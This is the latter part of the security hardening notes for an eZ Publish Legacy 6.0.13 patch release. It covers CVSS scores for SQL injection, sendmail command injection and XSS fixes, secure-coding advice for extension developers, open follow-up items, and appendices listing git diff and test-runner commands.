This file is suitable for archiving as release evidence.

---

## Risk Assessment and CVSS Scoring

### CVSS v3.1 Scoring Detail

#### SEC-01 (SQL Injection — eZRole)
| Metric | Value | Reason |
|---|---|---|
| Attack Vector | Network | Exploitable via HTTP if any API exposes role ID |
| Attack Complexity | Low | No special conditions required |
| Privileges Required | High | Role management requires admin privileges |
| User Interaction | None | No victim interaction required |
| Scope | Unchanged | Confined to application database |
| Confidentiality | High | Full database read possible via UNION injection |
| Integrity | High | DELETE and INSERT queries affected |
| Availability | High | Data destruction possible |
| **Base Score** | **7.2** | **High** |

#### SEC-02 (SQL Injection — ORDER BY column)
| Metric | Value | Reason |
|---|---|---|
| Attack Vector | Network | Sorting exposed to frontend in many views |
| Attack Complexity | Low | Straightforward injection via sort parameter |
| Privileges Required | Low | Any logged-in user or anonymous if sort is exposed |
| User Interaction | None | — |
| Scope | Unchanged | — |
| Confidentiality | High | Blind/error-based extraction of any table |
| Integrity | High | Possible via stacked queries depending on driver |
| Availability | High | DoS via expensive queries possible |
| **Base Score** | **8.8** | **High** |

#### SEC-05 (OS Command Injection — Sendmail)
| Metric | Value | Reason |
|---|---|---|
| Attack Vector | Network | Any contact form / registration that sends email |
| Attack Complexity | Low | Trivial to inject via email address field |
| Privileges Required | None | Unauthenticated access if public form exists |
| User Interaction | None | — |
| Scope | Unchanged | Web server process scope |
| Confidentiality | High | Full server file system readable |
| Integrity | High | Arbitrary file write / code execution |
| Availability | High | System-level access possible |
| **Base Score** | **9.8** | **Critical** |

### Overall Risk Summary

| Severity | Count | Issues |
|---|---|---|
| Critical | 1 | SEC-05 |
| High | 4 | SEC-02, SEC-03, SEC-04, SEC-06 |
| Medium | 2 | SEC-01, SEC-07 |
| Low | 0 | — |

The presence of a **Critical** severity finding (SEC-05) means the 6.0.13 release should
be treated as a **mandatory security update** for all production deployments. Site operators
should be notified to upgrade at the earliest opportunity. A security advisory should be
published alongside the 6.0.13 release notes.

---

## Affected Component Summary

| Component | Directory | Issue IDs | Change Type |
|---|---|---|---|
| Role management | `kernel/classes/` | SEC-01 | Integer cast on role ID |
| Content tree queries | `kernel/classes/` | SEC-02, SEC-03, SEC-04 | Column whitelist, escapeString |
| Mail transport | `lib/ezutils/classes/` | SEC-05 | escapeshellarg on sender |
| File compression | `lib/ezfile/classes/` | SEC-06 | escapeshellarg + logic fix |
| Search controller | `kernel/content/` | SEC-07 | htmlspecialchars on title |

**Total files modified for security reasons:** 5  
**Total SQL query construction sites fixed:** 9  
**Total shell command construction sites fixed:** 2  
**Total HTML output encoding sites fixed:** 1

---

## Recommendations for Extension Developers

Developers of eZ Publish extensions and custom kernels should audit their own code for the
same classes of vulnerability addressed in this release:

### SQL Injection Prevention

1. **Always cast integer IDs before SQL interpolation.** Any value retrieved from
   `$object->attribute('id')` or from user input that is expected to be an integer must be
   cast with `(int)` before use in a SQL string.

2. **Use `$db->escapeString()` for all string values in SQL.** The database abstraction
   layer provides `eZDB::instance()->escapeString()` precisely for this purpose. There is
   no excuse for raw string interpolation in SQL queries.

3. **Never interpolate `ORDER BY` column names from user input without whitelist
   validation.** The `preg_match('/^[a-zA-Z0-9_.]+$/', $colName)` pattern demonstrated in
   SEC-02 is the recommended approach.

4. **Consider migrating to parameterised queries** where the framework version supports
   them. PDO prepared statements are immune to SQL injection by design.

### OS Command Injection Prevention

1. **Always use `escapeshellarg()` for individual shell arguments.** If building a shell
   command that includes user-controlled strings, every individual argument must be wrapped
   in `escapeshellarg()`.

2. **Do not use `escapeshellcmd()` as a substitute.** `escapeshellcmd()` escapes an entire
   command string and is not equivalent to per-argument escaping. Misuse of
   `escapeshellcmd()` can leave argument-splitting vulnerabilities.

3. **Prefer PHP built-in functions over shell commands where possible.** PHP has native
   gzip compression via the `zlib` extension (`gzopen()`, `gzread()`, `gzwrite()`). Using
   PHP built-ins eliminates shell injection risk entirely.

### Cross-Site Scripting Prevention

1. **Always apply `htmlspecialchars($value, ENT_QUOTES, 'UTF-8')` before outputting any
   user-supplied string in an HTML context.** This includes page titles, heading text,
   attribute values, and any other location where the string will be included in HTML.

2. **Trust your template engine's auto-escaping, but do not rely on it exclusively.** The
   eZ Publish template engine does provide escaping operators, but values passed through
   PHP controller code to templates via `setTitle()`, `setVariable()`, and similar methods
   should be escaped at the point of preparation, not assumed to be escaped at the point
   of rendering.

---

## Backward Compatibility Notes

All seven security fixes are designed to be fully backward compatible:

- **`(int)` casts on integer IDs** have no effect on values that are already integers.
  Any code that was already passing valid integer role IDs continues to work identically.

- **`$db->escapeString()` on path strings** has no effect on valid path strings, which
  contain only digits and slashes — characters that `escapeString()` does not alter.

- **Column whitelist validation (SEC-02)** will reject any custom sort column name
  containing characters outside `[a-zA-Z0-9_.]`. Any extension or template currently
  passing such column names would have been producing unsafe SQL. Such code should be
  reviewed and updated. The failure mode is graceful: invalid sort fields are simply skipped
  with a debug warning, not a fatal error.

- **`escapeshellarg()` on email sender (SEC-05)** is transparent to the sendmail binary.
  Email delivery behaviour is unchanged.

- **`escapeshellarg()` on gzip filename (SEC-06)** also fixes a latent functional bug. If
  any code was previously relying on the broken `decompress()` implementation (which could
  not have worked correctly due to the static string bug), that code should be retested.
  The fixed implementation now correctly decompresses files.

- **`htmlspecialchars()` on search text (SEC-07)** changes the value of the string returned
  by `$Module->getTitle()` to be HTML-entity-encoded. Any code rendering this as
  plain text (rather than in an HTML context) will display entity-encoded strings. This is
  generally not observable to end users since rendered page titles are always HTML contexts.

---

## Open Items and Pending Work

The following items were identified during the security audit session and remain open for
follow-up in a future release:

| Ref | Priority | Description |
|---|---|---|
| OPEN-01 | HIGH | **DB schema audit for `ezrssexportitem.php`** — The `url_id` column reference in `create()` may reference a non-existent column. If the column is absent, `INSERT` will fail silently. Confirm schema includes this column. |
| OPEN-02 | HIGH | **Manual code review of `kernel/content/*.php`** — 12 controller files received null guard and isset fixes during this session. Each change should be manually reviewed before the 6.0.13 release tag is applied. |
| OPEN-03 | MED | **Functional test coverage for kernel/content/ patches** — The 12 content controller files are currently covered only by syntax lint, not by runtime functional tests. |
| OPEN-04 | MED | **`ReflectionMethod::setAccessible()` removal** — The functional test suite uses this PHP 8.1-deprecated / PHP 8.5-removed method in its preg test helpers. The suite should be updated to call public methods directly. |
| OPEN-05 | MED | **SQL injection runtime test for `ezrole.php`** — SEC-01 is verified by syntax lint only. A functional test exercising the actual query construction with a malicious ID value would provide stronger assurance. |
| OPEN-06 | LOW | **PDO prepared statement migration** — The `escapeString()` fixes are a correct and sufficient interim measure. Long-term, the platform should migrate to PDO prepared statements which are structurally immune to SQL injection. |
| OPEN-07 | LOW | **Expanded SOAP test coverage** — `eZSOAPCall`, `eZSOAPMessage`, and `eZSOAPFault` are not covered by the current functional test suite. |
| OPEN-08 | LOW | **XSS functional test for search.php** — SEC-07 is verified by syntax lint only. A test confirming that `htmlspecialchars()` is applied to a crafted input would provide stronger assurance. |

---

## Reviewer Sign-Off and Distribution

This document is prepared for internal review and distribution to the Exponential Open
Source Project security team lead.

**Prepared by:** Automated patch session — GitHub Copilot / Claude Sonnet 4.6  
**Review date:** 2026-02-21  
**Document status:** Ready for security team review  

### Distribution

This document, together with the following supporting artefacts, should be forwarded to
**security@exponential.earth** for review and sign-off prior to the 6.0.13 release:

| Artefact | Path | Description |
|---|---|---|
| This document | `doc/bc/6.0/hardening.md` | Full security hardening notes |
| Issue report | `tests/bin/issue_report_2026-02-21.txt` | Detailed per-issue tracking log |
| Change log | `doc/bc/6.0/phpunitvXXXX.md` § 14 | Per-issue before/after diffs and test links |
| Lint suite | `tests/bin/ezp_lint_patched.php` | Automated PHP syntax validation runner |
| Functional tests | `tests/bin/tests/functional_tests.php` | 48-test runtime flow test suite |
| Combined runner | `tests/bin/ezptestrunner_all_tests.php` | Unified lint + functional runner with report output |
| Test report | `tests/bin/test_report_2026-02-21.txt` | Machine-readable dated test output |

### Questions for Security Team Review

The following questions should be addressed by the security team reviewer before this
patch set is signed off for release:

1. Do any of the SQL injection issues (SEC-01 through SEC-04) meet the threshold for a
   formal CVE assignment? Given the project's public visibility and established user base,
   CVE disclosure may be appropriate for SEC-02 (ORDER BY injection) and SEC-05 (RCE via
   sendmail).

2. Should a security advisory be published on the GitHub Releases page alongside the
   6.0.13 tag, listing the issue IDs and encouraging all site operators to upgrade?

3. Is there a known-exploited status for any of these issues? Particularly SEC-05 (RCE via
   sendmail -f) — this vulnerability class is well-known in PHP CMS environments and may
   already be present in public exploit databases.

4. Should the 6.0 branch receive a patch-only release (6.0.13 containing only these
   security fixes) ahead of the normal release schedule, or can the security fixes wait for
   the next scheduled feature release?

5. Are there any prior security reports from the community or from existing penetration
   tests against Exponential deployments that correspond to any of the issues documented
   here? If so, those should be cross-referenced in the CVE or advisory.

---

## Appendix A: Full Diff Listing

The authoritative diff can be reproduced at any time by running:

```bash
# All security-relevant files:
git diff HEAD -- \
  kernel/classes/ezrole.php \
  kernel/classes/ezcontentobjecttreenode.php \
  lib/ezutils/classes/ezsendmailtransport.php \
  lib/ezfile/classes/ezgzipshellcompressionhandler.php \
  kernel/content/search.php

# All patched files (full scope including null guards, PHP 8.4 fixes, etc.):
git diff HEAD -- kernel/classes/ kernel/setup/ kernel/content/ lib/
```

Key diff excerpts for each security fix are quoted inline in the [Detailed Findings and
Fixes](#detailed-findings-and-fixes) section above.

---

## Appendix B: Test Script Inventory

| Script | Invocation | Purpose |
|---|---|---|
| `tests/bin/ezp_lint_patched.php` | `php tests/bin/ezp_lint_patched.php` | PHP syntax lint of 80 patched files |
| `tests/bin/tests/functional_tests.php` | `php tests/bin/tests/functional_tests.php [category]` | 48-test runtime flow suite |
| `tests/bin/ezptestrunner_all_tests.php` | `php tests/bin/ezptestrunner_all_tests.php [category] [--report]` | Combined runner; optional dated report |
| `bin/php/run_issue_tests.php` | `php bin/php/run_issue_tests.php [filter]` | Manifest-based lint with category filter |

Running the security-only test subset:

```bash
php tests/bin/ezptestrunner_all_tests.php security
```

Running the full suite with a dated report file:

```bash
php tests/bin/ezptestrunner_all_tests.php --report
# Output: tests/bin/test_report_2026-02-21.txt
```

Listing all available functional test categories:

```bash
php tests/bin/ezptestrunner_all_tests.php --list-categories
# security  soap  preg  dom  null  array  php84  setup  image
```

---

## Appendix C: CWE and OWASP Reference Mapping

| Issue | CWE | OWASP Top 10 (2021) | OWASP Prevention Reference |
|---|---|---|---|
| SEC-01 SQL Injection | CWE-89 | A03:2021 Injection | SQL Injection Prevention Cheat Sheet |
| SEC-02 ORDER BY Injection | CWE-89 | A03:2021 Injection | SQL Injection Prevention Cheat Sheet — ORDER BY section |
| SEC-03 LIKE Path Injection | CWE-89 | A03:2021 Injection | SQL Injection Prevention Cheat Sheet |
| SEC-04 Node/Path Injection | CWE-89 | A03:2021 Injection | SQL Injection Prevention Cheat Sheet |
| SEC-05 Sendmail RCE | CWE-78 | A03:2021 Injection | OS Command Injection Defense Cheat Sheet |
| SEC-06 Gzip Shell Injection | CWE-78 | A03:2021 Injection | OS Command Injection Defense Cheat Sheet |
| SEC-07 Reflected XSS | CWE-79 | A03:2021 Injection | XSS Prevention Cheat Sheet |

**Further reading:**

- [OWASP SQL Injection Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html)
- [OWASP OS Command Injection Defense Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/OS_Command_Injection_Defense_Cheat_Sheet.html)
- [OWASP Cross Site Scripting Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html)
- [PHP manual — escapeshellarg()](https://www.php.net/manual/en/function.escapeshellarg.php)
- [PHP manual — htmlspecialchars()](https://www.php.net/manual/en/function.htmlspecialchars.php)
- [PHP mail() fifth-argument injection — see PHP advisory MOPB-56-2007](https://www.php.net/manual/en/function.mail.php#refsect1-function.mail-notes)
- [CWE-89 Improper Neutralisation of Special Elements used in an SQL Command](https://cwe.mitre.org/data/definitions/89.html)
- [CWE-78 Improper Neutralisation of Special Elements used in an OS Command](https://cwe.mitre.org/data/definitions/78.html)
- [CWE-79 Improper Neutralisation of Input During Web Page Generation](https://cwe.mitre.org/data/definitions/79.html)

---

*End of document — eZ Publish Legacy 6.0.13 Security Hardening Notes*  
*Prepared 2026-02-21 | Distribution: security@exponential.earth*
